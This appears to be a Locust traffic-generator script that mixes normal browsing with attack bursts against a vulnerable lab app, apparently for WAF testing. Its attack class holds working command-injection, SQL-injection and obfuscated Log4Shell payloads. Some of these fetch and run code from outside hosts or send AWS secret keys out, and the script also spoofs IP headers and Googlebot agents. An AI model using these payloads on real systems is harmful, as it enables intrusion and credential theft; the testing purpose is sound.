##  This file will send hackazon traffic without spoofing IP but still using random ciphers

from locust import HttpUser, TaskSet, task, between, LoadTestShape
#from requests_toolbelt.adapters.source import SourceAddressAdapter
from ssladapter_modified import SourceAddressAdapter
import random
import urllib3
import socket
from datetime import datetime, time


urllib3.disable_warnings()

def login(self):
    #ua = pick_ua()
    response = self.client.post("/login.php", auth=("admin", "password"))
    #print("login Response status code:", response.status_code)
    #print("login Response text:", response.text)

def get_ip(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect((target, 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def pick_human_ua():
    ua1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"   ## human
    ua2 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"   ## human
    ua3 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"  ## human
    ua4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua6 = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
    ua7 = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
    #ua = [ua1, ua2, ua3, ua4, ua5]
    #return(random.choice(ua))
    return(random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7]))

def pick_human_ip():
    iplist = ["67.223.120.87", ## Comcast US
            "103.142.12.32", ##  Asahi Net (japanese ISP
            "109.237.177.16", ## Deutsch Telecom
            "142.214.161.165"]  ## Tmobile US
    return(random.choice(iplist))

def build_good_headers():
    headers={ 'user-agent': pick_human_ua(), 'X-Forwarded-For' : pick_human_ip() }
    return(headers)

def pick_attack_ua():
    ua1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"   ## human
    ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3"  ## bad bot
    ua3 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"   ## human
    ua4 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"  ## human
    ua5 = "Mozilla/5.0(iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F191 Safari/6533.18.5"  ## bad bot
    ua6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua8 = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
    ua9 = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
    #ua = [ua1, ua2, ua3, ua4, ua5]
    #return(random.choice(ua))
    return(random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9]))

def pick_attack_ip():
    iplist = ["1.12.2.189",  ##tencent
            "5.39.14.103",   ##OVH
            "52.14.30.137",  ## Amazon
            "67.223.120.89", ## Comcast US
            "103.142.12.34", ##  Asahi Net (japanese ISP
            "109.237.177.18", ## Deutsch Telecom
            "142.214.161.167",  ## Tmobile US
            "78.108.177.52", ## - threat IP
            "1.163.44.118" ## - windows exploits
    ]
    return(random.choice(iplist))

def build_attack_headers():
    headers={ 'user-agent': pick_attack_ua(), 'X-Forwarded-For' : pick_attack_ip() }
    return(headers)


class normal_user(HttpUser):
    def __init__(self, parent):
        super().__init__(parent)
        #print(self.locust.host)
    wait_time = between(5, 9)
    weight = 1

    @task(100)
    def index(self):
        self.client.get("/index.php", headers=build_good_headers(), verify=False, cookies=self.client.cookies.get_dict())

    @task(100)
    def about(self):
        self.client.get("/about.php", headers=build_good_headers(), verify=False, cookies=self.client.cookies.get_dict())

    @task(100)
    def security(self):
        self.client.get("/security.php", headers=build_good_headers(), verify=False, cookies=self.client.cookies.get_dict())

    @task(100)
    def instructions(self):
        self.client.get("/instructions.php", headers=build_good_headers(), verify=False, cookies=self.client.cookies.get_dict())

    @task(1)
    def bot_scan(self):
        path1 = "/.env" 
        path2 = "/.DS_Store"
        path3 = "/.git/config"
        url = random.choice([path1,path2,path3])
        iplist = ["1.12.2.188",  ##tencent
                "5.39.14.100",   ##OVH
                "52.14.30.134",  ## Amazon
                "67.223.120.89", ## Comcast US
                "103.142.12.33", ##  Asahi Net (japanese ISP
                "109.237.177.17", ## Deutsch Telecom
                "142.214.161.166",  ## Tmobile US
        ]
        scanbot_headers = { "user-agent" : "Go-http-client/1.1", 'X-Forwarded-For' : random.choice(iplist) } 
        self.client.get( url, headers=scanbot_headers, verify=False, cookies=self.client.cookies.get_dict())

    @task(1)
    def google_scan(self):
        path1 = "/" 
        path2 = "/index.html"
        path3 = "/about.php"
        url = random.choice([path1,path2,path3])

        ###https://developers.google.com/static/search/apis/ipranges/googlebot.json
        googlebot_ips = ["66.249.76.66", "34.100.182.98", "35.247.243.241", "66.249.79.133"]
        ###https://developers.google.com/search/docs/crawling-indexing/overview-google-crawlers#user_agent_version
        googlebot_uas = ["Mozilla/5.0 (compatible; Google-Site-Verification/1.0)", 
                        "Googlebot/2.1 (+http://www.google.com/bot.html)",
                        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
                        "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://developers.google.com/search/docs/crawling-indexing/overview-google-crawlers)"
                        ]
        googlebot_headers={'user-agent': random.choice(googlebot_uas), 'X-Forwarded-For' : random.choice(googlebot_ips)}
        self.client.get( url, headers=googlebot_headers, verify=False, cookies=self.client.cookies.get_dict())

    def on_start(self):
        # List of IP's that can be used as "source" - hardcoded for simplicity
        # ip = random.choice(ips)
        ip = get_ip((self.host).partition("//")[2])
        #ip = "172.17.0.2"
        #ip = "10.0.45.96"

        print("tweaking mount")
        print(f"using IP {ip}")
        self.client.mount("https://", SourceAddressAdapter(ip))
        self.client.mount("http://", SourceAddressAdapter(ip))
        self.client.verify = False
        login(self)

class attack_user(HttpUser):
    def __init__(self, parent):
        super().__init__(parent)
        #print(self.locust.host)
    wait_time = between(0, 3)
    weight = 20

    @task(10)
    def vuln_xss(self):
        self.client.post("/vulnerabilities/exec/", headers=build_attack_headers(), data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"}, verify=False, cookies=self.client.cookies.get_dict())
        # with self.client.post("/vulnerabilities/exec/", headers={'user-agent': ua}, cookies=self.locust.client.cookies.get_dict(), data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"}, verify=False, catch_response=True) as response:
        #     if response.status_code == 403:
        #         response.success()

    @task(10)
    def vuln_sqli(self):   
        self.client.post("/vulnerabilities/sqli/", headers=build_attack_headers(), data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"},verify=False, cookies=self.client.cookies.get_dict())
        # with self.client.post("/vulnerabilities/sqli/", headers={'user-agent': ua}, cookies=self.locust.client.cookies.get_dict(), data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"},verify=False, catch_response=True) as response:
        #     if response.status_code == 403:
        #         response.success()


    @task(10)
    def upload_badfile(self):
        files = {'file': ('eicar_com.pdf', open('eicar_com.zip', 'rb'), 'application/zip', {'Expires': '0'})}
        r = self.client.post("/vulnerabilities/upload/", files=files, headers=build_attack_headers(), verify=False, cookies=self.client.cookies.get_dict())

# send fewer
    @task(10)
    def log4j_vuln(self):
        attacks = [
            '${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x',
            '${jndi:ldap://attacker.com/a}',
            '${j${}ndi:ldap://attacker.com/a}',
            #'${java:ldap://attacker.com/a}',
            #'${java:vm}',
            '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}',
            '${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}',
            '${jndi:rmi://adsasd.asdasd.asdasd}',
            '${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}',
            '${jndi:ldap://x.x.x.x/#Touch}',
            'Mozilla/5.0 ${jndi:ldap://x.x.x.x:5555/ExploitD}/ua',
            '${jndi:http://x.x.x.x/callback/https-port-443-and-http-callback-scheme}',
            '(+http://www.google.com/bot.html)${jndi:ldap://x.x.x.x:80/Log4jRCE}',
            '${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}',
            '${jndi:ldap://www.blogs.example.com.gu.c1me2000ssggnaro4eyyb.example.com/www.blogs.example.com}',
            '${jndi:dns://aeutbj.example.com/ext}',
            '${jndi:ldap://x.x.x.x:12344/Basic/Command/Base64/KGN1cmwgLXMgeC54LngueDo1ODc0L3kueS55Lnk6NDQzfHx3Z2V0IC1xIC1PLSB4LngueC54OjU4NzQveS55LnkueTo0NDMpfGJhc2g=}',
            '${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x',
            '${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}',
            '${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC82Mi4xNTIuMTE4LjE2Nzo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC82Mi4xNTIuMTE4LjE2Nzo4MCl8YmFzaA==}',
            '${jndi:dns://waf.c2.avidemo.vmware.com.o9wpr53j36094avnc3i41m821zv0j453h.interact.sh}',
            '${jndi:dns://{{callback_host}}}',
            '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}',
            '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}',
            '${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}',
            '${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}',
            '${${::-j}ndi:rmi://{{callback_host}}/{{random}}}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}',
            '${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6rj5oav1urrh0k38680cg5umyoyy8fgo.ab-ui.com}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6rj5oav1urrh0k38680cg5umyayy8f1n.ab-ui.com}',
            '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}',
            '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}',
            '${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}',
            ]
        #for each in attacks:
        #print('-------------------')
        #print('Payload: ', each)
        # Authentication fails, because of missing JWT Token
        #headers = {'X-Forwarded-For': '12.12.12.12',
        #        'User-Agent': each}
        ua = (random.choice(attacks))
        self.client.get("/about.php", headers={'user-agent': ua, 'X-Forwarded-For': pick_ip()}, verify=False, cookies=self.client.cookies.get_dict())

    def on_start(self):
        # List of IP's that can be used as "source" - hardcoded for simplicity
        # ip = random.choice(ips)
        # because i wont remember, the .partition business gives just the self.host after the // in http://
        ip = get_ip((self.host).partition("//")[2])
        #ip = "172.17.0.2"
        #ip = "10.0.45.96"

        print("tweaking mount")
        print(f"using IP {ip}")
        print(f"self host ip: {self.host}")
        self.client.mount("https://", SourceAddressAdapter(ip))
        self.client.mount("http://", SourceAddressAdapter(ip))
        self.client.verify = False
        login(self)


class randomattacks_with_timeofday_bursting(LoadTestShape):
    def tick(self):
        global random_time_duration
        try:
            random_time_duration
        except NameError:
            random_time_duration = random.randint(60,43200)

        #print(f"this is the random time - {random_time_duration}")
        #print(f"this is the current run time {self.get_run_time()}")

        global old_time
        try: 
            old_time
        except NameError: 
            old_time = datetime.timestamp(datetime.now())
        #print(old_time)
        #old_time = datetime.now()

        print(f"this  is the time diff between now and oldtime - {(datetime.timestamp(datetime.now())-old_time)}")
        attack_run_time = 400
        attack_user_count = 150
        attack_spawn_rate = 30
        daily_count = 0
        if datetime.now().hour == 0 and ( 0 <= datetime.now().minute < 5):
            random.randint(60,43200)
            old_time = datetime.timestamp(datetime.now())
            daily_count == 0
        #print(self.get_current_user_count())
        #while True:  no need for a loop, locust already does this
        # Check if the randomly selected duration has
        # passed before running your code block.

        ###  use epoch time for calculations, easier.  Check to see if we've hit the random interval timer to start attacking
        ###  if not, do normal traffic runs
        ###  might make sense to switch this logic around, if old time is more than random time, attack
        ###  have the normal runs be the else clause
        if (datetime.timestamp(datetime.now())-old_time) < random_time_duration:
            if datetime.now().time() >= time(8) and datetime.now().time()< time(10):
                print("normal highload")
                return (60, 1, [normal_user])
            elif datetime.now().time() >= time(16) and datetime.now().time()< time(18):
                print("normal highload")
                return (60, 1, [normal_user])
            elif datetime.now().time() >= time(10) and datetime.now().time()< time(16):
                print("normal midday load")
                return (30, 1, [normal_user])
            else:
                print("normal lowload")
                return (10, 5, [normal_user])
        else:
            print(f" current runtime - {self.get_run_time()}")
            if self.get_run_time() > 605:   ### needs to be higher than attack run time but lower than attack interval timer
                self.reset_time()
            print(f" runtime after reset - {self.get_run_time()}")
            if self.get_run_time() < attack_run_time: ## and self.get_current_user_count()  >= attack_user_count:
                print(f"attacking run number {daily_count + 1}")
                return (attack_user_count, attack_spawn_rate, [attack_user])
            else:
                if daily_count == 0:
                    random_time_duration = random.randint(21600,43200)
                    old_time = datetime.timestamp(datetime.now())
                    daily_count += 1
                    return (10, 5, [normal_user])
                elif daily_count == 1:
                    random_time_duration = 9999999
                    old_time = datetime.timestamp(datetime.now())
                    return (10, 5, [normal_user])
                else:
                    print("daily count outside expected range")
                    return (10, 5, [normal_user])

